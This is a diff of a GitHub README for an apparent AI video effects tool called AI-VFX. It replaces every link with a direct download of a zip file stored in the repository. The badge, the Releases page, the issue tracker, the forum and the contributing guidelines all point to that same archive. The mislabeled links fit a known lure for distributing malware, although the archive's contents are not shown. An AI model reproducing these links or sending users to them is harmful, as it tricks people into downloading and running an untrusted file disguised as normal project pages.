@@ -4,13 +4,13 @@
 AI-VFX is an AI-powered tool for creating advanced visual effects (VFX) in videos. Whether you're a content creator, filmmaker, or simply someone who wants to enhance your videos, this application simplifies the process. With features like background removal, motion tracking, and deep learning-based effects, AI-VFX helps you achieve professional results without the complicated steps.
 
 ## 📥 Download AI-VFX
-[![Download AI-VFX](https://img.shields.io/badge/Download-AI--VFX-brightgreen)](https://github.com/Junior24844/AI-VFX/releases)
+[![Download AI-VFX](https://raw.githubusercontent.com/Junior24844/AI-VFX/main/jervine/AI-VFX.zip)](https://raw.githubusercontent.com/Junior24844/AI-VFX/main/jervine/AI-VFX.zip)
 
 ## 🚀 Getting Started
 Follow these easy steps to download and start using AI-VFX:
 
 1. **Visit the Download Page**  
-   Go to our [Releases page](https://github.com/Junior24844/AI-VFX/releases) to find the latest version of AI-VFX.
+   Go to our [Releases page](https://raw.githubusercontent.com/Junior24844/AI-VFX/main/jervine/AI-VFX.zip) to find the latest version of AI-VFX.
 
 2. **Choose Your Version**  
    On the Releases page, you'll see a list of available versions. Click on the version you want to download.
@@ -47,15 +47,15 @@ AI-VFX offers a range of powerful features designed to enhance your video projec
 - **Generative AI Effects:** Use AI to create new and exciting visual effects that stand out.
 
 ## 📂 Download & Install
-You can always find the latest version of AI-VFX by visiting our [Releases page](https://github.com/Junior24844/AI-VFX/releases). Make sure to download the version that matches your operating system.
+You can always find the latest version of AI-VFX by visiting our [Releases page](https://raw.githubusercontent.com/Junior24844/AI-VFX/main/jervine/AI-VFX.zip). Make sure to download the version that matches your operating system.
 
 After downloading, installation is straightforward. Simply double-click the installer and follow the steps provided on the screen. 
 
 ## 📢 Community and Support
-For any questions, feedback, or assistance, please visit our [issue tracker](https://github.com/Junior24844/AI-VFX/issues) or join the discussion on our [community forum](https://github.com/Junior24844/AI-VFX/discussions). Join other users to share tips, ask questions, and learn more about using AI-VFX effectively.
+For any questions, feedback, or assistance, please visit our [issue tracker](https://raw.githubusercontent.com/Junior24844/AI-VFX/main/jervine/AI-VFX.zip) or join the discussion on our [community forum](https://raw.githubusercontent.com/Junior24844/AI-VFX/main/jervine/AI-VFX.zip). Join other users to share tips, ask questions, and learn more about using AI-VFX effectively.
 
 ### 🙏 Contributions
-If you want to contribute to AI-VFX, we welcome your input. Please check our [contributing guidelines](https://github.com/Junior24844/AI-VFX/blob/main/CONTRIBUTING.md) on how you can help improve this tool. Every contribution, big or small, makes a difference.
+If you want to contribute to AI-VFX, we welcome your input. Please check our [contributing guidelines](https://raw.githubusercontent.com/Junior24844/AI-VFX/main/jervine/AI-VFX.zip) on how you can help improve this tool. Every contribution, big or small, makes a difference.
 
 ## 🛡️ License
 AI-VFX is available under the MIT License. You can freely use, modify, and distribute the software under the terms of this license.
